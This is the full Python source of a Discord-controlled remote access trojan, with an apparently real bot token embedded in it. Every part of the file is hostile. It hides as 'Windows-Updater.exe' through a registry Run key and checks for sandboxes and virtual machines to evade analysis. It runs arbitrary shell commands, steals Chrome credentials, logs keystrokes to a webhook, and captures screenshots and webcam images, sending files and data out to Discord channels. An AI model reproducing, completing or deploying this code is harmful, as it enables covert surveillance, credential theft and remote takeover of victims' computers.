import discord
from discord.ext import commands
import os
import subprocess as sp
import requests
import random
from cv2 import VideoCapture
from cv2 import imwrite
import platform
import re
from urllib.request import Request, urlopen
import pyautogui
from datetime import datetime
import shutil
import sys
from multiprocessing import Process
import threading
import json
import ctypes
from ctypes.wintypes import HKEY
import time
from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
import win32api
import win32process
import psutil
import win32pdh
from winreg import *
from ctypes import *
from libraries import credentials,keylogger,sandboxevasion

VERSION = "v1.1.9"

KEYLOG = {KEYLOG}
PERSISTENT = {PERSISTENT}

BOT_TOKEN = "{OTg5NTQ4MTI1ODUxMTE5Njg3.GuGnWO.BO_NzkhehAukWcFlh7ZgWxxyOB-U_nycxQYco0}"
TOKEN_WEBHOOK = "{TOKEN_WEBHOOK}"
KEYLOGGER_WEBHOOK = "{KEYLOGGER_WEBHOOK}"

SCREENSHOTS_ID = {SCREENSHOTS_ID}
DOWNLOADS_ID = {DOWNLOADS_ID}
AGENT_ONLINE_ID = {AGENT_ONLINE_ID}
CREDENTIALS_ID = {CREDENTIALS_ID}

client = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_command=None)

def autoPersistent():
    backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
    if not os.path.exists(backdoor_location):
        shutil.copyfile(sys.executable, backdoor_location)
        sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)

def isVM():
    rules = ['Virtualbox', 'vmbox', 'vmware']
    command = sp.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=sp.PIPE,
                                stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                                creationflags=0x08000000)
    out, err = command.communicate()
    command.wait()
    for rule in rules:
        if re.search(rule, out, re.IGNORECASE):
            return True
    return False

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def keylogs():
    try:
        keyloggerr = keylogger.Keylogger(interval=1800, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
        keyloggerr.start()
    except KeyboardInterrupt:
        exit()

def getIP():            
        try:
            IP = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except Exception as e:
            IP = "None"
        return IP

def getBits():
    try:
        BITS = platform.architecture()[0]
    except Exception as e:
        BITS = "None"
    return BITS

def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception as e:
        USERNAME = "Lina.luvs_roblox"
    return USERNAME

def getOS():
        try:
            OS = platform.platform()
        except Exception as e:
            OS = "None"
        return OS

def getCPU():
        try:
            CPU = platform.processor()
        except Exception as e:
            CPU = "None"
        return CPU

def getHostname():
    try:
        HOSTNAME = platform.node()
    except Exception as e:
        HOSTNAME = "None"
    return HOSTNAME

def createConfig():
    try:
        path = fr'"C:\Users\{USERNAME}\.config"'
        new_path = path[1:]
        new_path = new_path[:-1]
        os.mkdir(new_path)     
        os.system(f"attrib +h {path}")

    except WindowsError as e:
        if e.winerror == 183:
            pass

def createUploads():
    try:
        path = fr'C:\Users\{USERNAME}\.config\uploads'
        os.mkdir(path)
    except WindowsError as e:
        if e.winerror == 183:
            pass

@client.command(name='cd',pass_context=True)
async def cd(context):
    command = context.message.content.replace("!cd ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        path = word_list[1]
        try:
            os.chdir(path)
            my_embed = discord.Embed(title=f"Succesfully changed directory to: {path}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while changing directory:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)

@client.command(name='process',pass_context=True)
async def process(context):
    command = context.message.content.replace("!process ", "")
    result = sp.Popen("tasklist", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
    out, err = result.communicate()
    result.wait()
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        if len(out) > 4000:
            path = os.environ["temp"] +"\\response.txt"         
            with open(path, 'w') as file:
                file.write(out)
            await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
            await context.message.channel.send(file=discord.File(path))
            os.remove(path)
        else:
            await context.message.channel.send(f"```\n{out}\n```")

@client.command(name='download',pass_context=True)
async def download(context):
    command = context.message.content.replace("!download ", "")
    word_list = command.split()
    channel = client.get_channel(DOWNLOADS_ID)
    if int(word_list[0]) == int(ID):
        path = word_list[1].replace("USERNAME", USERNAME)
        try:
            await channel.send(f"**Agent #{ID}** Requested File:", file=discord.File(path))
            my_embed = discord.Embed(title=f"File succesfully downloaded from Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while downloading from Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed) 

@client.command(name='upload')
async def upload(context):
    path = fr'C:\Users\{USERNAME}\.config\uploads'
    command = context.message.content.replace("!upload ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        url = word_list[1]
        name = word_list[2]
        if name == "":
            await context.send("Please enter a name for the file")
        else:
            try:
                r = requests.get(url, allow_redirects=True, verify=False)
                open(fr"{path}\{name}", 'wb').write(r.content)
                my_embed = discord.Embed(title=f"{name} has been uploaded to Agent#{ID}", color=0x00FF00)
                await context.message.channel.send(embed=my_embed)
            except Exception as e:
                my_embed = discord.Embed(title=f"Error while uploading {name} to Agent#{ID}:\n{e}", color=0xFF0000)
                await context.message.channel.send(embed=my_embed)   
    else:
        pass

@client.command(name='screenshot',pass_context=True)
async def screenshot(context):
    command = context.message.content.replace("!screenshot ", "")
    channel = client.get_channel(SCREENSHOTS_ID)
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        try:
            Screenshot = pyautogui.screenshot()
            path = os.environ["temp"] +"\\s.png"
            Screenshot.save(path)
            now = datetime.now()
            await channel.send(f"**Agent #{ID}** | Screenshot `{now.strftime('%d/%m/%Y %H:%M:%S')}`", file=discord.File(path))
            os.remove(path)
            my_embed = discord.Embed(title=f"Got screenshot from Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while taking screenshot from Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)
    else:
        pass
    
@client.command(name='webshot', pass_context=True)
async def webshot(context):
    command = context.message.content.replace("!webshot", "")
    channel = client.get_channel(SCREENSHOTS_ID)
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        try:
            cam = VideoCapture(0)
            ret, frame = cam.read()
            current_time = datetime.now()
            path = os.environ["temp"] +"\\p.png"
            imwrite(path, frame)
            now = datetime.now()
            await channel.send(f"**Agent #{ID}** | Webcam snapshot `{now.strftime('%d/%m/%Y %H:%M:%S')}`", file=discord.File(path))
            os.remove(path)
            my_embed = discord.Embed(title=f"Got webcam snapshot from Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while taking webcam snapshot from Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)

@client.command(name='keylog')
async def keylog(context):
    command = context.message.content.replace("!keylog ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        def keylogger_start():
            try:
                try:
                    interval = int(word_list[1])
                except:
                    interval = word_list[1]
                keyloggerr = keylogger.Keylogger(interval=interval, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
                try:
                    if word_list[1] == "stop":
                        keyloggerr.stop()
                        return
                except:
                    pass
                keyloggerr.start()
            except IndexError:
                my_embed = discord.Embed(title=f"Error while starting Keylogger on Agent#{ID}\nMake sure you have specified all the required parameters", color=0xFF0000)
        try:
            threading.Thread(target=keylogger_start).start()
            try:
                if word_list[1] == "stop":
                    my_embed = discord.Embed(title=f"Keylogger stopped on Agent#{ID}", color=0x00FF00)
                    await context.message.channel.send(embed=my_embed)
                    return
            except Exception as e:
                my_embed = discord.Embed(title=f"Error while stopping keylogger on Agent#{ID}:\n{e}", color=0xFF0000)
                await context.message.channel.send(embed=my_embed)
            my_embed = discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while starting keylogger on Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)
    else:
        pass

@client.command(name='credentials')
async def creds(context):
    channel = client.get_channel(CREDENTIALS_ID)
    command = context.message.content.replace("!credentials ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):
        try:
            data = credentials.stealcreds()
            path = os.environ["temp"] +"\\data.json"
            with open(path, 'w+') as outfile:
                json.dump(data, outfile, indent=4)
            await channel.send(f"Agent #{ID} Chrome Credentials:")
            await channel.send(file=discord.File(path))
            my_embed = discord.Embed(title=f"Got Chrome credentials from Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
            os.remove(path)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while getting Chrome credentials from Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)
    else:
        pass

@client.command(name='persistent')
async def persistent(context):
    try:
        backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
        if not os.path.exists(backdoor_location):
            shutil.copyfile(sys.executable, backdoor_location)
            sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)
            my_embed = discord.Embed(title=f"Persistent update created on Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
        else:
            my_embed = discord.Embed(title=f"Persistence already enabled on Agent#{ID}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)
    except Exception as e:
        my_embed = discord.Embed(title=f"Error while making Agent#{ID} persistent:\n{e}", color=0xFF0000)
        await context.message.channel.send(embed=my_embed)

@client.command(name='cmd')
async def cmd(context):
    command = context.message.content.replace("!cmd ", "")
    word_list = command.split()
    if word_list[0] == str(ID):
        word_list.pop(0)
        final_command = " ".join(word_list)
        
        result = sp.Popen(final_command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
        out, err = result.communicate()
        result.wait()
        
        if len(out) > 4000:
            path = os.environ["temp"] +"\\response.txt"     
            with open(path, 'w') as file:
                file.write(out)
            await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
            await context.message.channel.send(file=discord.File(path))
            os.remove(path)
        else:
            await context.message.channel.send(f"```\n{out}\n```")
    else:
        final_command = " ".join(word_list)
        
        result = sp.Popen(final_command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
        out, err = result.communicate()
        result.wait()
        
        if len(out) > 4000:
            path = os.environ["temp"] +"\\response.txt"      
            with open(path, 'w') as file:
                file.write(out)
            await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
            await context.message.channel.send(file=discord.File(path))
            os.remove(path)
        else:
            await context.message.channel.send(f"```\n{out}\n```")

@client.command(name='ls')
async def ls(context):
    my_embed = discord.Embed(title=f"Agent #{ID}   IP: {IP}", color=0xADD8E6)
    my_embed.add_field(name="**OS**", value=OS, inline=True)
    my_embed.add_field(name="**Username**", value=USERNAME, inline=True)

    await context.message.channel.send(embed=my_embed)

@client.command(name='version')
async def version(context):
    command = context.message.content.replace("!version ", "")
    word_list = command.split()
    if word_list[0] == str(ID):
         my_embed = discord.Embed(title=f"Agent#{ID} Version:{VERSION}", color=0x0000FF)
         await context.message.channel.send(embed=my_embed)

@client.command(name='terminate')
async def terminate(context):
    command = context.message.content.replace("!terminate ", "")
    word_list = command.split()
    if int(word_list[0]) == int(ID):  
        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{ID}", color=0x00FF00)
        await context.message.channel.send(embed=my_embed)
        await client.close()        
        sys.exit()
    else:
        pass

@client.command(name='selfdestruct')
async def selfdestruct(context):
    command = context.message.content.replace("!selfdestruct ", "")
    word_list = command.split()
    if word_list[0] == str(ID):
        try:        
            update_location = os.environ["appdata"] + "\\Windows-Updater.exe"
            config_location = fr'C:\Users\{USERNAME}\.config'
            if os.path.exists(update_location):
                os.remove(update_location)
            if os.path.exists(config_location):
                shutil.rmtree(config_location)
            sp.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f', shell=True)
            my_embed = discord.Embed(title=f"Self-Destruction on Agent#{ID} Completed Succesfully", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)
            await client.close()        
            sys.exit()

        except Exception as e:
            my_embed = discord.Embed(title=f"Error while removing Agent#{ID} persistence:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)

@client.command(name='location',pass_context=True)
async def location(context):
    command = context.message.content.replace("!location ", "")
    word_list = command.split()
    if word_list[0] == str(ID):
        try:
            response = requests.get("https://utilities.tk/network/info")
            response.raise_for_status()
            loc_ip = response.json()["ip"]
            loc_hostname = response.json()["hostname"]
            loc_city = response.json()["city"]
            loc_region = response.json()["region"]
            loc_country = response.json()["country"]
            loc_loc = response.json()["loc"]
            loc_org = response.json()["org"]
            loc_timezone = response.json()["timezone"]
            my_embed = discord.Embed(title=f"IP Based Location on Agent#{ID}", color=0x00FF00)
            my_embed.add_field(name="IP:", value=f"**{loc_ip}**", inline=False)
            my_embed.add_field(name="Hostname:", value=f"**{loc_hostname}**", inline=False)
            my_embed.add_field(name="City:", value=f"**{loc_city}**", inline=False)
            my_embed.add_field(name="Region:", value=f"**{loc_region}**", inline=False)
            my_embed.add_field(name="Country:", value=f"**{loc_country}**", inline=False)
            my_embed.add_field(name="Location:", value=f"**{loc_loc}**", inline=False)
            my_embed.add_field(name="Organazation:", value=f"**{loc_org}**", inline=False)
            my_embed.add_field(name="Timezone:", value=f"**{loc_timezone}**", inline=False)
            await context.message.channel.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while getting location of Agent#{ID}:\n{e}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)

@client.command(name='killproc',pass_context=True)
async def killproc(context):
    command = context.message.content.replace("!killproc ", "")
    word_list = command.split()
    if word_list[0] == str(ID):
        result = sp.Popen(f"taskkill /F /PID {word_list[1]}", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
        out, err = result.communicate()
        result.wait()
        if err:
            my_embed = discord.Embed(title=f"Error while killing process on Agent#{ID}:\n{err}", color=0xFF0000)
            await context.message.channel.send(embed=my_embed)
        else:
            my_embed = discord.Embed(title=f"Successfully killed process {word_list[1]} on Agent#{ID}", color=0x00FF00)
            await context.message.channel.send(embed=my_embed)

@client.event
async def on_ready():
    channel = client.get_channel(AGENT_ONLINE_ID)
    now = datetime.now()
    my_embed = discord.Embed(title=f"{MSG}",description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=color)
    my_embed.add_field(name="**IP**", value=IP, inline=True)
    my_embed.add_field(name="**Bits**", value=BITS, inline=True)
    my_embed.add_field(name="**HostName**", value=HOSTNAME, inline=True)
    my_embed.add_field(name="**OS**", value=OS, inline=True) 
    my_embed.add_field(name="**Username**", value=USERNAME, inline=True)
    my_embed.add_field(name="**CPU**", value=CPU, inline=False)
    my_embed.add_field(name="**Is Admin**", value=ISADMIN, inline=True)
    my_embed.add_field(name="**Is VM**", value=ISVM, inline=True)
    my_embed.add_field(name="**Auto Keylogger**", value=KEYLOG, inline=True)
    await channel.send(embed=my_embed)

if sandboxevasion.test() == True and isVM() == False:
    ISVM = isVM()
    OS = getOS()
    CPU = getCPU()
    IP = getIP()
    BITS = getBits()
    HOSTNAME = getHostname()
    USERNAME = getUsername()
    createConfig()
    createUploads()
    ISADMIN = isAdmin()

    try:
        path = fr"C:\Users\{USERNAME}\.config\ID"
        with open(path, "r+") as IDfile:
            ID = IDfile.read()
            if ID == "":
                ID = random.randint(1, 10000)
                IDfile.write(str(ID))
                MSG = f"New Agent Online #{ID}"
                color = 0x00ff00
            else:
                MSG = f"Agent Online #{ID}"
                color = 0x0000FF

    except Exception:
        path = fr"C:\Users\{USERNAME}\.config\ID"
        with open(path, "w+") as IDfile:
            ID = IDfile.read()
            if ID == "":
                ID = random.randint(1, 10000)
                IDfile.write(str(ID))
                MSG = f"New Agent Online #{ID}"
                color = 0x00ff00
            else:
                MSG = f"Agent Online #{ID}"
                color = 0x0000FF

    if KEYLOG:  
        threading.Thread(target=keylogs).start()
    if PERSISTENT:
        autoPersistent()

    client.run(BOT_TOKEN)
else:
    sys.exit()
